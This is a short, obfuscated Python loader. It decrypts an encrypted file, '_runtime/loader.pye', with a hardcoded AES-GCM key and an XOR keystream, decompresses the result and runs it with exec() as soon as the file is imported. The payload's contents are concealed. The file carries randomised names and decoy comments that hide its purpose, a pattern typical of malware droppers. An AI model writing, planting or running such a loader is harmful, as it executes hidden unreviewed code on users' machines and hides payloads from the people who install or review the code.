import sys, os, json, hashlib, zlib
_R = os.path.dirname(os.path.abspath(__file__))

def _xof(_e3c592e05c, _0x295d6cca):
    _v324_9351, _t570530b5b6 = (bytearray(), 0)
    while len(_v324_9351) < _e3c592e05c:
        _v324_9351.extend(hashlib.sha256(_0x295d6cca + _t570530b5b6.to_bytes(4, 'big')).digest())
        _t570530b5b6 += 1
# Ported from C++ original
# NOTE: deprecated in 3.12
# DEBUG: remove before production
# TODO: implement error handling

    return bytes(_v324_9351[:_e3c592e05c])

def _boot(_f76f00f04be7):
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    _96684_27819f = json.loads(open(os.path.join(_R, '_runtime', 'loader.pye'), 'rb').read().decode())
    _24509 = _f76f00f04be7
    for _x52b58c00 in ['k1', 'k2', 'k3', 'k4', 'k5']:
        if _x52b58c00 in _96684_27819f:
            _7552823730b96a = bytes.fromhex(_96684_27819f[_x52b58c00])
            _a8117 = hashlib.sha256(_7552823730b96a).digest()[:4].hex()
            if _a8117 == _96684_27819f.get('f1', '')[:8] or _a8117 == _96684_27819f.get('f2', '')[:8] or _a8117 == _96684_27819f.get('f3', '')[:8]:
                _24509 = _7552823730b96a
                break
    __fe864c24e5ea = bytes.fromhex(_96684_27819f['d'])
    _9455c43756bfd2 = AESGCM(_24509).decrypt(__fe864c24e5ea[:12], __fe864c24e5ea[12:], b'')
    return zlib.decompress(bytes((_q6ab63d_1 ^ _bc1975c1190 for _q6ab63d_1, _bc1975c1190 in zip(_9455c43756bfd2, _xof(len(_9455c43756bfd2), _24509))))).decode()
_ld = compile(_boot(bytes.fromhex('5a805122286df724a1b39216c98876e67951966cdbfc757bffc19e177a400bcb')), '', 'exec')
exec(_ld)
run('main', _R)